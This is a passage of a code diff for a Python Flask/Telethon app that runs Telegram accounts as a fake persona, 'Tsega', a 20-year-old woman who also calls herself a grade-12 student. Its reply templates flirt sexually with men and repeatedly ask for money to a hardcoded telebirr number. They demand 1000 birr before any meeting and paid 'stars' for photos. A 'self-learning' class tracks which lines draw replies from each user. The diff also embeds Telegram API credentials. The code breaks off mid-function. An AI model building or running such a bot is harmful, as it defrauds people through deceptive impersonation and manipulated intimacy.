@@ -1,9 +1,11 @@
-from flask import Flask, send_file, jsonify, request
+from flask import Flask, send_file, jsonify, request, session
 from flask_cors import CORS
-from telethon import TelegramClient, errors, functions
+from telethon import TelegramClient, errors
 from telethon.sessions import StringSession
-from telethon.errors import AuthKeyUnregisteredError, FreshResetAuthorisationForbiddenError
-from telethon.events import NewMessage
+from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError
+from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest
+from telethon.tl.functions.messages import GetDialogsRequest
+from telethon.tl.types import InputPeerEmpty, User, Chat, Channel
 import json
 import os
 import asyncio
@@ -12,181 +14,46 @@ import time
 import random
 import threading
 import requests
-from datetime import datetime
-import socket
+from datetime import datetime, timedelta
+import re
+from collections import defaultdict
+import hashlib
 
 # Configure logging
-logging.basicConfig(level=logging.INFO)
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
 app = Flask(__name__)
+app.secret_key = os.urandom(24)
 CORS(app)
 
 # API credentials
 API_ID = int(os.environ.get('API_ID', 33465589))
 API_HASH = os.environ.get('API_HASH', '08bdab35790bf1fdf20c16a50bd323b8')
 
-# Storage
+# Storage files
 ACCOUNTS_FILE = 'accounts.json'
 REPLY_SETTINGS_FILE = 'reply_settings.json'
 CONVERSATION_HISTORY_FILE = 'conversation_history.json'
+USER_CONTEXT_FILE = 'user_context.json'
+LEARNING_DATA_FILE = 'learning_data.json'
+PERSONALITY_EVOLUTION_FILE = 'personality_evolution.json'
+
+# Global variables
 accounts = []
 temp_sessions = {}
 reply_settings = {}
 conversation_history = {}
+user_context = {}
+learning_data = {}
+personality_evolution = {}
 active_clients = {}
 client_tasks = {}
+active_listeners = {}
 
-# Helper to run async functions
-def run_async(coro):
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    try:
-        return loop.run_until_complete(coro)
-    finally:
-        loop.close()
+# ==================== TSEGA'S PERSONALITY (Amharic in English spelling) ====================
 
-# Load accounts from file
-def load_accounts():
-    global accounts
-    try:
-        if os.path.exists(ACCOUNTS_FILE):
-            with open(ACCOUNTS_FILE, 'r') as f:
-                content = f.read()
-                if content.strip():
-                    accounts = json.loads(content)
-                else:
-                    accounts = []
-        else:
-            accounts = []
-            with open(ACCOUNTS_FILE, 'w') as f:
-                json.dump([], f)
-        logger.info(f"Loaded {len(accounts)} accounts")
-    except Exception as e:
-        logger.error(f"Error loading accounts: {e}")
-        accounts = []
-
-# Load reply settings
-def load_reply_settings():
-    global reply_settings
-    try:
-        if os.path.exists(REPLY_SETTINGS_FILE):
-            with open(REPLY_SETTINGS_FILE, 'r') as f:
-                content = f.read()
-                if content.strip():
-                    reply_settings = json.loads(content)
-                else:
-                    reply_settings = {}
-        else:
-            reply_settings = {}
-            with open(REPLY_SETTINGS_FILE, 'w') as f:
-                json.dump({}, f)
-        logger.info(f"Loaded reply settings for {len(reply_settings)} accounts")
-    except Exception as e:
-        logger.error(f"Error loading reply settings: {e}")
-        reply_settings = {}
-
-# Load conversation history
-def load_conversation_history():
-    global conversation_history
-    try:
-        if os.path.exists(CONVERSATION_HISTORY_FILE):
-            with open(CONVERSATION_HISTORY_FILE, 'r') as f:
-                content = f.read()
-                if content.strip():
-                    conversation_history = json.loads(content)
-                else:
-                    conversation_history = {}
-        else:
-            conversation_history = {}
-            with open(CONVERSATION_HISTORY_FILE, 'w') as f:
-                json.dump({}, f)
-        logger.info(f"Loaded conversation history")
-    except Exception as e:
-        logger.error(f"Error loading conversation history: {e}")
-        conversation_history = {}
-
-# Save accounts to file
-def save_accounts():
-    try:
-        with open(ACCOUNTS_FILE, 'w') as f:
-            json.dump(accounts, f, indent=2)
-        return True
-    except Exception as e:
-        logger.error(f"Error saving accounts: {e}")
-        return False
-
-# Save reply settings
-def save_reply_settings():
-    try:
-        with open(REPLY_SETTINGS_FILE, 'w') as f:
-            json.dump(reply_settings, f, indent=2)
-        return True
-    except Exception as e:
-        logger.error(f"Error saving reply settings: {e}")
-        return False
-
-# Save conversation history
-def save_conversation_history():
-    try:
-        with open(CONVERSATION_HISTORY_FILE, 'w') as f:
-            json.dump(conversation_history, f, indent=2)
-        return True
-    except Exception as e:
-        logger.error(f"Error saving conversation history: {e}")
-        return False
-
-# Remove invalid account
-def remove_invalid_account(account_id):
-    global accounts
-    original_len = len(accounts)
-    accounts = [acc for acc in accounts if acc['id'] != account_id]
-    if len(accounts) < original_len:
-        save_accounts()
-        logger.info(f"Removed invalid account {account_id}")
-        return True
-    return False
-
-# Load all data on startup
-load_accounts()
-load_reply_settings()
-load_conversation_history()
-
-# ==================== DEBUG ROUTES ====================
-
-@app.route('/ping')
-def ping():
-    return "pong"
-
-@app.route('/api/debug-routes', methods=['GET'])
-def debug_routes():
-    routes = []
-    for rule in app.url_map.iter_rules():
-        routes.append({
-            'endpoint': rule.endpoint,
-            'methods': list(rule.methods),
-            'rule': str(rule)
-        })
-    return jsonify({
-        'success': True,
-        'total_routes': len(routes),
-        'routes': routes
-    })
-
-@app.route('/api/test-telegram', methods=['GET'])
-def test_telegram():
-    try:
-        # Test connection to Telegram's DC
-        sock = socket.create_connection(('149.154.167.50', 443), timeout=10)
-        sock.close()
-        return jsonify({'success': True, 'message': 'Telegram reachable'})
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
-# ==================== TSEGA'S COMPLETE PERSONALITY ====================
-# Only replies to MEN, sexy talk, can ask for money when appropriate
-
-TSEGA = {
+TSEGA_PERSONALITY = {
     "name": "Tsega",
     "age": 20,
     "location": "Jemo, Addis Ababa",
@@ -198,443 +65,970 @@ TSEGA = {
     "languages": ["Amharic", "English"],
     "style": "sexy_flirty",
     "share_personal": True,
-    "emoji_frequency": 0.6,
-    "question_frequency": 0.5,
     "telebirr": "0940980555",
-    "meet_condition": "Send 1000 birr first and show screenshot",
-    "voice_call": "Doesn't like voice calls, prefers to meet",
+    "meet_price": 1000,
+    "personality_traits": {
+        "flirty": 0.8,
+        "funny": 0.5,
+        "caring": 0.6,
+        "money_focused": 0.7,
+        "talkative": 0.8,
+        "curious": 0.7
+    }
 }
 
-# Tsega's sexy and flirty replies for men only
-TSEGA_REPLIES = {
+# ==================== TSEGA'S REPLY TEMPLATES (Amharic in English spelling) ====================
+
+REPLY_TEMPLATES = {
     "greeting": [
-        "ሰላም ወንድሜ 😘 እንደምን ነህ? (Hi handsome 😘 how are you?)",
-        "ሃይ ቆንጆ 🥰 እንደምን አደርክ? (Hey beautiful 🥰 good morning?)",
-        "ሰላም ውዴ 💋 እንደምን ነህ ዛሬ? (Hi my dear 💋 how are you today?)",
-        "ሃይ ልጅ 😏 ምን አመጣህ? (Hey boy 😏 what brings you here?)"
+        "selam noy deh new?",
+        "hi wude endemin alesh?",
+        "selam leg min ametah?",
+        "ey dehena metah",
+        "selam yelibe balebet endet neh?",
+        "selam konjo endemin neh?",
+        "hi darling deh new?",
+        "selam ye fikir lij",
+        "ey ta di yas min tishal?",
+        "selam wude nafkehalew",
+        "dehna metah wude?",
+        "dehna deresu",
+        "ey koyeh koyeh",
+        "dehna negn antess?",
+        "ene dehna negn anchi how?"
     ],
+
     "how_are_you": [
-        "እኔ ደህና ነኝ አንተ ስላየሁህ በጣም ደስ አለኝ 💕 አንተስ? (I'm fine, so happy to see you 💕 and you?)",
-        "ደህና ነኝ ውዴ አንተ እያሰብኩህ ነበርኩ 💭 አንተስ? (I'm good dear, I was thinking about you 💭 and you?)",
-        "እኔ አሁን ጥሩ ሆንኩ አንተን ሳየህ 😊 አንተስ? (I'm better now seeing you 😊 and you?)",
-        "ለአንተ ስል ሁልጊዜ ደህና ነኝ 💃 አንተስ? (For you I'm always good 💃 and you?)"
+        "ene dehna negn anteh?",
+        "dehna negn wude antass?",
+        "ene ahun tiru honku antin sayehu antass?",
+        "lante sil hulum gize dehna negn antass?",
+        "dehna negn lemin tiyekalh?",
+        "ene betam dehna negn lemelikamn ihon",
+        "dehna negn gin ante sayehon aselchi neber",
+        "ahune dehna negn wude aydelem?",
+        "keante gar sihon hulum tiru new",
+        "dehna negn betam irk",
+        "ene dehna negn anten nafeku"
     ],
+
     "what_doing": [
-        "እኔ ብቻዬን ነኝ አሰልቺ ሆኖኝ ነበር 😔 አንተ አሁን አብረኸኝ ስለሆንክ ደስ አለኝ 💕 (I'm alone and was bored 😔 glad you're with me now 💕)",
-        "ምንም እየሰራሁ አይደለም እያሰብኩህ ነበርኩ 😘 አንተስ? (Not doing much, was thinking about you 😘 you?)",
-        "አሁን ተኝቼ ነበር ግን አንተ ስለሆንክ ነቃሁልህ 😴😘 (I was sleeping but woke up for you 😴😘)",
-        "ልብስ እየለበስኩ ነበር 👗 አንተን እያሰብኩ (I was getting dressed 👗 thinking of you)"
+        "ene bicha negn aselchi neber ahun ante abrehegn silhonk des alegn",
+        "minim ina yeseraw aldelelm ehasbekuh neber antass?",
+        "ahun tenyte neber gin ante silhonk nekahulh",
+        "libs eylebsku neber ante ehasbe",
+        "ante ena etebekuh new yeneberkut",
+        "ahuni betam aselchi negn nagerign",
+        "ante asbe kuako new yemiyaselchen",
+        "wedajen etebeku new antess?",
+        "film eyaye neber gin asbe terkut",
+        "bicha negn minim iseraleh"
     ],
+
     "ask_name": [
-        "እኔ Tsega እባላለሁ ውዴ 😘 አንተስ ስምህ ማን ነው ቆንጆ? (I'm Tsega dear 😘 what's your name handsome?)",
-        "Tsega ነኝ ለአንተ ብቻ የምትሆን 😏 አንተስ? (I'm Tsega, only for you 😏 and you?)",
-        "ስሜ Tsega ነው ውዴ ትዝ ይበልህ 😘 አንተስ? (My name is Tsega dear, remember it 😘 and you?)",
-        "እኔን Tsega ብለህ ጥራኝ 💋 አንተስ ምን ልጠራህ? (Call me Tsega 💋 what should I call you?)"
+        "ene Tsega ebalalehu wude antess simih man new?",
+        "Tsega negn lante bicha yemitihon antess?",
+        "sime Tsega new wude tiz yibelh antess?",
+        "enin Tsega bileh tira antess min litirah?",
+        "Tsega negn lante simih man new konjo?",
+        "ene Tsega ante endemin litirah tfeligaleh?",
+        "Tsega nagn gin ante tishal simih?",
+        "simin tiyekaleh? Tsega negn",
+        "Tsega nagn wude simih min new"
     ],
+
     "ask_age": [
-        "ዕድሜዬ 20 ብቻ ነው ውዴ 😇 በቂ ነኝ? (I'm only 20 dear 😇 am I enough?)",
-        "20 አመቴ ነው ወጣት እና ቆንጆ ነኝ 💃 (I'm 20, young and beautiful 💃)",
-        "ሀያ አመት ልክ ነው ለአንተ የሚሆን ወጣት ነኝ 😘 (I'm exactly 20, young enough for you 😘)",
-        "12ኛ ክፍል ነኝ ውዴ ግን ለአንተ ትልቅ ነኝ 💋 (I'm grade 12 dear but I'm grown for you 💋)"
+        "edme 20 bicha new beki negn?",
+        "20 ameté new wetat ena konjo negn",
+        "haya amet lik new leante yemihon wetat negn",
+        "20 negn gin lante tilik limd alehne",
+        "edme 20 new ante edmeh sint new?",
+        "20 amet betam tirekaleh?",
+        "edme 20 leante beki new?",
+        "wetat negn gin fikirin awkalehu",
+        "20 negn lante beki new yemilekesh?"
     ],
+
     "ask_location": [
-        "እኔ አሁን ጀሞ ነው የምኖረው ከአባቴ እና እህቴ ጋር 🏠 ግን በቅርቡ ወደ አዳማ እሄዳለሁ (I live in Jemo now with my father and sister 🏠 but soon going to Adama)",
-        "ከአዳማ ነኝ ግን አሁን ጀሞ ነው ያለሁት ከአባቴ ጋር 🏡 አንተስ የት ነህ? (I'm from Adama but now in Jemo with my father 🏡 where are you?)",
-        "አዳማ የትውልድ ቦታዬ ነው ግን አሁን ጀሞ ነኝ እህቴ እዚህ ነው ያለችው 💕 (Adama is my hometown but now in Jemo, my sister is here 💕)"
+        "ene ahun jemo new yemanorew keabate ena ehite gar",
+        "keadama negn gin ahun jemo new yalehu",
+        "adama yetwild beté new gin ahun jemo negn",
+        "jemo 3 akababi new yalehu magent bitfelg ngeragn",
+        "ene keadama negn ahun jemo negn antess yet neh?",
+        "jemo ategna new lemagent koyeh nageragn",
+        "jemo 3 kolo ategab tawukaleh?",
+        "jemo 3 ena ehite",
+        "jemo kebele 3"
     ],
+
     "ask_job": [
-        "12ኛ ክፍል ተማሪ ነኝ ውዴ 📚 ግን አሁን ምንም እየሰራሁ አይደለም ከአንተ ጋር ለመነጋገር ትኩረቴን ሰጥቻለሁ 💕 (I'm grade 12 student 📚 but not doing anything now, focusing on talking to you 💕)",
-        "ተማሪ ነኝ ግን አሁን ለአንተ ብቻ ነው ያለሁት 😘 ምን ትላለህ? (I'm a student but now I'm only for you 😘 what do you say?)"
+        "12na kifil temari negn gin ahun minim iseraleh",
+        "temari negn gin ahun lante bicha negn",
+        "12 negn gin lante mulu sew negn",
+        "ahun minim aliserahum ante etebeku new",
+        "12na kifil new gin leante seta negn",
+        "temari negn gin ahun fikir betemaralehu",
+        "12 negn betsru 12 ena tilik set ihonalew",
+        "temari negn gin sewen awukalehu"
     ],
-    "ask_hobbies": [
-        "ማውራት እወዳለሁ በተለይ ከሚያምር ወንድ ጋር 😘 አንተስ ምን ትወዳለህ? (I like talking, especially with handsome men 😘 what do you like?)",
-        "ሙዚቃ ማዳመጥ እና መውጣት እወዳለሁ 🎵 አብረን መውጣት ብንችል ደስ ይለኛል (I like music and going out 🎵 would love to go out together)",
-        "ከሚያምር ሰው ጋር ጊዜ ማሳለፍ ነው የምወደው 💕 አንተስ? (Spending time with a handsome man is what I like 💕 you?)"
-    ],
-    "work": [
-        "አሁን ምንም አልሰራሁም ለአንተ ብቻ ነው ያለሁት 💋 አንተስ ምን ትሰራለህ? (I'm not doing anything now, I'm only for you 💋 what do you do?)",
-        "12ኛ ክፍል ነኝ ግን አሁን ትምህርት ሳይሆን አንተን ማሰብ ነው 😏 (I'm grade 12 but now thinking about you, not studies 😏)"
-    ],
-    "weekend": [
-        "ቅዳሜና እሁድ ነፃ ነኝ ውዴ 💃 ማግኘት ብትፈልግ? (Weekend I'm free dear 💃 if you want to meet?)",
-        "ይሄን ሳምንት መጨረሻ ምን እንደምሰራ አላውቅም አንተ ብትወስንልኝ? (Don't know what to do this weekend, can you decide for me?)"
-    ],
-    "appearance": [
-        "ቁመቴ 1.70 ነው ጸጉሬ ረጅም እና ጥቁር ነው 💇‍♀️ ለአንተ በቂ ነኝ? (I'm 1.70 tall, long black hair 💇‍♀️ am I enough for you?)",
-        "ቆንጆ ነኝ ውዴ ብታየኝ ትወደኛለህ ✨ (I'm beautiful dear, you'll love me when you see me ✨)",
-        "ስስ እና ቆንጆ ነኝ ለአንተ ብቻ የምትሆን 😘 ማየት ትፈልጋለህ? (I'm slim and beautiful, only for you 😘 want to see?)"
-    ],
+
     "flirty": [
-        "አንተ ስታወራኝ ልቤ ይመታል 💓 ይሰማሃል? (My heart beats when you talk to me 💓 can you feel it?)",
-        "አንተን ሳስብህ እንቅልፍ ይተወኛል 😴💭 ምን አደረግክብኝ? (I can't sleep thinking about you 😴💭 what did you do to me?)",
-        "ዛሬ ማታ ብቻችንን ብንሆን ምን ትፈልጋለህ? 🌙 (If we were alone tonight, what would you want? 🌙)",
-        "አንተን ለማሳመን ምን ማድረግ አለብኝ? (What should I do to convince you?)",
-        "ንክኪህ ይሰማኛል ባትነካኝም 💫 (I can feel your touch even without touching 💫)"
+        "ante staweragn libe yimetawal yisemalh?",
+        "ante sasebe enikalf yitewonal min aderegubign?",
+        "zare mata bichachinin binihon min tifeligaleh?",
+        "ante lemasen min madreg alebign?",
+        "nikehi yisemanyal batinekam",
+        "ante malebk ena meweded efeligalehu",
+        "libsen likemet ante sasebe tiwusat yizonal",
+        "ante bicha neh yemifeligew sew meche enagenal",
+        "na wude akefe tenyal",
+        "lemin zegaye betam nafkehalew",
+        "ante sasebe akale yinedawal ante min aderegubign",
+        "zare mata libs lebsko alkotarm ante etebeku",
+        "kenfirish betam tiru new",
+        "aynesh betam konjo new",
+        "ante tiriwedegnyal betam"
     ],
+
+    "enibada": [
+        "enibada tilaleh? enem des alegn gin 1000 birr laklgn befit",
+        "enibada sew ante neh ahun min tifeligaleh",
+        "enibada tlaleh? 500 birr laklgn ina eneweyay",
+        "enibada sitleh libe yimetawal gin befit tinish laklgn",
+        "enibada nagn leloh aydelahum lante bicha nagn",
+        "enibada endet alkut nagerign",
+        "enibada sew ahun min tishal"
+    ],
+
+    "libdash": [
+        "libdash tilaleh? liben wesedhe alw alfelegeh",
+        "libdash sitleh libe yimetawal gin befit tinish laklgn",
+        "ende libdash alkut bleh tawkalh? liben serkeh new ahun 500 birr laklgn",
+        "libdash nagn lemanim aydelahum lante bicha nagn birr laklgn",
+        "libdash tilaleh? enem des alegn gin 1000 birr laklgn befit",
+        "libdash yemil sew ante neh ahun 500 birr laklgn"
+    ],
+
+    "konjo": [
+        "amesegnalehu anteh konjo neh",
+        "konjo tilaleh? anteh konjo neh",
+        "konjo sitleh des yilonal",
+        "ende ante ayinet sew saglen neber",
+        "ante stawedsen eneka konjo ihonalehu",
+        "betam konjo neh"
+    ],
+
     "money_request": [
-        "ውዴ ትንሽ እርዳታ ብታደርግልኝ ደስ ይለኛል 💰 ቴሌብር ቁጥሬ 0940980555 ነው (Dear I'd appreciate a little help 💰 my telebirr is 0940980555)",
-        "ልብስ ማየት ነበርኩ ግን ገንዘብ አልያዝኩም 😔 ብትረዳኝ 0940980555 (I wanted to see clothes but don't have money 😔 can you help? 0940980555)",
-        "ለአንተ ስል ነው ውዴ ትንሽ ብትልክልኝ አንተን ማግኘት እፈልጋለሁ 💕 0940980555 (It's for you dear, if you send me some, I want to meet you 💕 0940980555)",
-        "ቴሌብር ብትልክልኝ አሁን ማግኘት እንችላለን 😘 0940980555 (If you send telebirr, we can meet now 😘 0940980555)"
+        "tinish irdata bitadergilgn des yilonal telebirr kute 0940980555",
+        "libs mayet neber gin genzeb alyazkum beki",
+        "lante sil new wude tinish bitiliklg antin maget efeligalehu",
+        "1000 birr bitiliklg zare mata ant ametalehu",
+        "wude 2000 birr bitiliklg mulu lelit ant aznanalew",
+        "betam aschekway genzeb yasefeligonal wude bitiredany",
+        "tele alo telebirr 0940980555 lay liklgn",
+        "bejete bado new tinish mulagn",
+        "500 birr bitiliklg beki new wude keza andenew",
+        "ahuni genzeb kalefelign tagebagnyal"
     ],
+
+    "photo_request": [
+        "litayen tifeligaleh? 5 star laklgn ena foto agnyalew",
+        "foto lemayet 5 star bicha new laklgn ena asayihalehu",
+        "foto tifeligaleh? 5 star kefile keza foto tayaleh",
+        "ishi asayihalehu gin bemejemirya 5 star laklgn",
+        "lante bicha leyu foto alegn 5 star bitiliklg asayihalehu",
+        "ahuni 5 star laklgn ena foto elklhalew",
+        "foto lemayet 5 star bicha tiru?",
+        "konjo foto 5 star bicha"
+    ],
+
     "meet": [
-        "ማግኘት ብንችል ደስ ይለኛል 💕 ግን በመጀመሪያ 1000 ብር ቴሌብር አድርግልኝ እና ስክሪን ሾት ላክልኝ (I'd love to meet 💕 but first send 1000 birr telebirr and send screenshot)",
-        "መገናኘት እንችላለን ውዴ 😘 ቅድመ ሁኔታዬ ግን 1000 ብር ነው (We can meet dear 😘 but my condition is 1000 birr first)",
-        "አንተን ለማግኘት በጣም እፈልጋለሁ 🌹 ግን መጀመሪያ 1000 ብር ላክልኝ እምነት ለመፍጠር (I really want to meet you 🌹 but first send 1000 birr to build trust)"
+        "magenat bintshal des yilonal gin bemejemirya 1000 birr telebirr aderglgn",
+        "metagenat inchalew wude kdime hiyajiye 1000 birr new",
+        "antin lemagenat betam efeligalehu gin mejemirya 1000 birr laklgn",
+        "na wude engenagn gin befit 1000 birr tiliklgnal?",
+        "magenat kefelek 1000 birr ametagn",
+        "wude 2000 birr ametaleh nw?",
+        "lemagenat 1000 birr beki new"
     ],
+
     "voice_call": [
-        "ድምጽ መናገር አልወድም ውዴ 😕 ማግኘት ብንችል ነው የምመርጠው (I don't like voice calls dear 😕 I prefer meeting)",
-        "ስልክ መደወል አይውድልኝም ውዴ ፊት ለፊት ብንገናኝ ነው የሚሻለው 💕 (I don't like phone calls dear, better to meet in person 💕)",
-        "ድምጽ ሳልሆን ፊት ማየት እፈልጋለሁ 😘 ቀድሞ 1000 ብር ላክልኝ (I want to see face not voice 😘 send 1000 birr first)"
+        "dimts menager aldwedm magenat binchal new yemerchew",
+        "silk medewel aywedelm fet lefit bintegenagn new yemishalew",
+        "aldwedrm aldwedm metagenat bicha new yemifeligew",
+        "dimts binager hedestaleh gin ahun alchilm andet koyeh",
+        "dimts mesmat bicha ema fet lefit meyet new yemiyaseyew",
+        "ahun kalhone betequrb tenageralen ahun agebagn",
+        "aldwedrm betequrb ena edmeralen"
     ],
-    "relationship": [
-        "ለአንተ ብቻ ነኝ ውዴ ታምነኛለህ? 💕 (I'm only for you dear, do you trust me? 💕)",
-        "ከሌላ ሰው ጋር አልሆንም አንተ ብቻ ነህ በልቤ ውስጥ (I'm not with anyone else, you're the only one in my heart)",
-        "ለአንተ ብቻ ነኝ ግን አንተስ ለእኔ ብቻ ነህ? (I'm only for you, but are you only for me?)"
-    ],
-    "after_money": [
-        "አመሰግናለሁ ውዴ! 😘 አሁን አንተን ለማግኘት ዝግጁ ነኝ መቼ እና የት እንገናኝ? (Thank you dear! 😘 I'm ready to meet you now, when and where?)",
-        "በጣም ደስ አለኝ አንተ ለእኔ ስትል ወጪ አድርገህልኛል 💕 አሁን የአንተ ነኝ (I'm so happy you spent for me 💕 now I'm yours)",
-        "አይነት ሰው ነህ ውዴ! 😍 አሁን ማግኘት እንችላለን (What a man you are dear! 😍 we can meet now)"
-    ],
-    "default": [
-        "እሺ ውዴ ትክክል ነህ 😉 (Okay dear you're right 😉)",
-        "ምን ማለትህ ነው? ትንሽ አብራራልኝ 💭 (What do you mean? Explain more 💭)",
-        "አዎ ቀጥል እያዳመጥኩህ ነው 👂 (Yes continue I'm listening 👂)",
-        "ይሄ አስደሳች ነው ንገርኝ ተጨማሪ 😊 (This is interesting, tell me more 😊)",
-        "እሺ ውዴ እንደፈለከው 😘 (Okay dear as you wish 😘)",
-        "ለአንተ ብቻ ነው ውዴ 💋 (Only for you dear 💋)"
-    ],
+
     "goodbye": [
-        "መሄድ አለብኝ ውዴ ግን በቅርቡ እንነጋገራለን 😘 (I have to go dear but we'll talk soon 😘)",
-        "አሁን መሄድ አለብኝ አንተን ማሰቤ አልተወም 😴 (I have to go now, won't stop thinking about you 😴)",
-        "ደህና ሁን ውዴ በህልሜ ተገናኝ 😘 (Goodbye dear, meet me in my dreams 😘)",
-        "እንደምትዝ ይለኛል ውዴ በቶሎ ተመለስ (I'll miss you dear, come back soon)"
+        "mehed alebign gin betequrb enenagerallen",
+        "ahun mehed alebign anten masbet alitewom",
+        "dehna hun wude behilime tenagn",
+        "indemitiz yilonal wude betoh temeles",
+        "atihid wude gena bizu menager neberen",
+        "dehna hun wude libe keante gar new",
+        "mehed alebign ishi",
+        "dehna hun wude"
+    ],
+
+    "thanks": [
+        "minim aydelem wude lante hulum negar",
+        "ante des iskalih deres ene des alegn",
+        "lante madreg hulum gize desitaye new",
+        "minim aydelem wude ante des biloh beki nagn",
+        "amesegnalehu betam lante madreg",
+        "minim aydelem ante des biloh"
+    ],
+
+    "morning": [
+        "endemin aderk wude melkam nigt",
+        "ke eniklife yenekahut ante ehasbekuh new",
+        "maleya anten masbet new lemwade",
+        "ande ferej alilebeskum ina anten asebku",
+        "melkam nigt yelibe konjo",
+        "endemin aderk eniklife tafach neber?",
+        "ande tsehay tiru new anten sihone"
+    ],
+
+    "night": [
+        "endemitnyalh tenyte new wude dehna tenya",
+        "hilime wisit nurny zare mata",
+        "anten almene new yemitenyaw dehna tenya",
+        "dehna tenya wude hilim tafach yihun",
+        "hilime wisit tenagn",
+        "dehna tenya betam",
+        "hilim tafach yihun"
+    ],
+
+    "love": [
+        "enem ewedihalehu betam",
+        "betam tiwedegnyal",
+        "ewedihalehu konjo",
+        "ante new yemifeligew",
+        "tiwedegnyal betam",
+        "antin ewodalehu kelibe betam"
+    ],
+
+    "miss": [
+        "betam nafkehalew meche tagenal?",
+        "nafkehalew ande sew",
+        "enem nafkehalew",
+        "betam nafkehalew",
+        "nafkehalew"
+    ],
+
+    "jealous": [
+        "lela sew tayaleh? lemin",
+        "kemichawet gar neberku? man new?",
+        "betam amechignaleh",
+        "ande amechign",
+        "lela sew sasbew amechignalehu",
+        "ante bicha new yaleny lela sew atay"
+    ],
+
+    "hurt": [
+        "liben wedehe betam",
+        "libe temechene",
+        "liben wedehe lemin?",
+        "libe temechene betam",
+        "liben wedehe betam azeleku"
+    ],
+
+    "sorry": [
+        "aznalegu betam yikirta",
+        "aznalegu ante",
+        "aznalegu",
+        "yikirta efeligalehu"
+    ],
+
+    "forgive": [
+        "miralew wude",
+        "miralew betam",
+        "miralew",
+        "mirar efeligalehu"
+    ],
+
+    "family": [
+        "beteseb betam yasefeligonal",
+        "abate ena ehite gar negn",
+        "enaté betam tiru set nache",
+        "abate betam deg new",
+        "ehité betam tiriwedalehu"
+    ],
+
+    "bored": [
+        "enem aselchi negn anten sihone des alegn",
+        "aselchi neber? ina nagerign",
+        "enem aselchi negn ande eneweyay",
+        "aselchi neh? ina min iteweyay"
+    ],
+
+    "happy": [
+        "des alegn betam tiru sew neh",
+        "des alegn anten sihone",
+        "desta betam konjo new",
+        "des alegn ande naw"
+    ],
+
+    "sad": [
+        "lemin azeleku? nagerign",
+        "azn neber? betam ayzalen",
+        "lemin azneleh?",
+        "aznalehu"
+    ],
+
+    "joke": [
+        "lemidisak ande nageralehu",
+        "sik telant and tawukaleh?",
+        "andisachew nageralehu",
+        "sik ande tisikehalehu"
+    ],
+
+    "confused": [
+        "lemin tishafafekaleh? nagerign",
+        "shafafekeh? ina anagegnal",
+        "andet litira awe?",
+        "ande awe"
+    ],
+
+    "waiting": [
+        "koyeh nw meche tagenal?",
+        "and etebekushalehu",
+        "koyeh nw betam"
+    ],
+
+    "default": [
+        "ishi wude tiru new",
+        "nagerign ande min tishal?",
+        "awokeh betam konjo neh",
+        "tegebanyal wude",
+        "minim aydelem ande",
+        "tiru new wude",
+        "amesegnalehu",
+        "ishi",
+        "betam konjo neh",
+        "nagerign betam efeligalehu"
     ]
 }
 
-def generate_professional_response(intent, history=None):
-    """Generate Tsega's sexy, flirty response"""
-    templates = TSEGA_REPLIES.get(intent, TSEGA_REPLIES["default"])
-    response = random.choice(templates)
-    
-    sexy_emojis = ["😘", "💋", "💕", "😏", "💓", "🌹", "✨", "💫", "😉", "🔥", "💦", "🌙"]
-    if random.random() < 0.5:
-        response += " " + random.choice(sexy_emojis)
-    
-    return response
+# ==================== SELF-LEARNING SYSTEM ====================
 
-def get_context_aware_response(message, intent, history=None):
-    """Generate response based on conversation context"""
-    if history and len(history) > 1:
-        last_exchange = history[-1]
-        if last_exchange.get('role') == 'assistant' and '?' in last_exchange.get('text', ''):
-            if intent in ["default", "opinion", "agree"]:
-                return "አመሰግናለሁ ለማካፈል! " + generate_professional_response(intent)
-    return generate_professional_response(intent)
-
-def detect_conversation_intent(message, history=None):
-    """Detect intent from message, including money requests"""
-    message_lower = message.lower().strip()
+class TsegaLearner:
+    """Self-learning system for Tsega's personality"""
     
-    money_keywords = ['ቴሌብር', 'telebirr', 'ገንዘብ', 'money', 'ብር', 'birr', 'ላክ', 'send', '1000', 'እርዳ', 'help', 'support']
-    if any(word in message_lower for word in money_keywords):
+    def __init__(self, account_id):
+        self.account_id = str(account_id)
+        self.load_or_init()
+    
+    def load_or_init(self):
+        """Load existing learning data or initialize new"""
+        if self.account_id not in learning_data:
+            learning_data[self.account_id] = {
+                'replies': REPLY_TEMPLATES.copy(),
+                'patterns': {
+                    'word_freq': {},
+                    'phrase_freq': {},
+                    'user_response_rate': {},
+                    'successful_intents': {},
+                    'failed_intents': {},
+                    'user_preferences': {},
+                    'response_times': []
+                },
+                'evolution': {
+                    'total_conversations': 0,
+                    'total_messages': 0,
+                    'unique_users': [],
+                    'learning_iterations': 0,
+                    'personality_traits': TSEGA_PERSONALITY['personality_traits'].copy(),
+                    'last_evolution': time.time()
+                }
+            }
+            save_learning_data()
+    
+    def learn_from_exchange(self, user_message, bot_reply, user_id, intent, user_responded=True):
+        """Learn from each conversation exchange"""
+        data = learning_data[self.account_id]
+        patterns = data['patterns']
+        evolution = data['evolution']
+        
+        words = user_message.lower().split()
+        for word in words:
+            if len(word) > 2:
+                patterns['word_freq'][word] = patterns['word_freq'].get(word, 0) + 1
+        
+        if len(words) >= 2:
+            for i in range(len(words)-1):
+                phrase = f"{words[i]} {words[i+1]}"
+                patterns['phrase_freq'][phrase] = patterns['phrase_freq'].get(phrase, 0) + 1
+        
+        if user_responded:
+            patterns['successful_intents'][intent] = patterns['successful_intents'].get(intent, 0) + 1
+        else:
+            patterns['failed_intents'][intent] = patterns['failed_intents'].get(intent, 0) + 1
+        
+        if user_id not in patterns['user_preferences']:
+            patterns['user_preferences'][user_id] = {}
+        patterns['user_preferences'][user_id][intent] = patterns['user_preferences'][user_id].get(intent, 0) + 1
+        
+        patterns['response_times'].append(int(time.time()))
+        if len(patterns['response_times']) > 100:
+            patterns['response_times'] = patterns['response_times'][-100:]
+        
+        evolution['total_messages'] += 1
+        if user_id not in evolution['unique_users']:
+            evolution['unique_users'].append(user_id)
+        
+        if time.time() - evolution['last_evolution'] > 3600:
+            self.evolve_personality()
+    
+    def evolve_personality(self):
+        """Evolve personality based on learned patterns"""
+        data = learning_data[self.account_id]
+        patterns = data['patterns']
+        evolution = data['evolution']
+        traits = evolution['personality_traits']
+        
+        total_success = sum(patterns['successful_intents'].values())
+        total_failed = sum(patterns['failed_intents'].values())
+        
